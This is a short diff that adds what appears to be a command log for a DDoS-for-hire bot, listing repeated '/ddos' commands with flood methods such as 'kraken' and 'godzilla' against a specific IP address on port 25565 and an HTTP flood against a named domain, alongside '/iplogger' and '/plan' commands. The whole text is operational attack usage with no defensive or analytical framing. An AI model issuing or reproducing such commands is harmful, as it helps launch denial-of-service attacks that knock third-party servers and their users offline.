@@ -1,0 +1,16 @@
+/methods
+/tr4p
+/ddos godzilla squid 178.63.67.95 120 25565
+/ddos godzilla udp 178.63.67.95 120 25565
+/ddos kraken std 178.63.67.95 120 25565
+/ddos kraken std 178.63.67.95 120 25565
+/ddos kraken squid 178.63.67.95 120 25565
+/methods
+/ddos kraken http prismadrop.xyz 120
+/ddos kraken squid 178.63.67.95 120 25565
+/ddos kraken std 178.63.67.95 120 25565
+/ddos kraken std 178.63.67.95 120 25565
+/iplogger
+/vpn
+/plan
+/plan
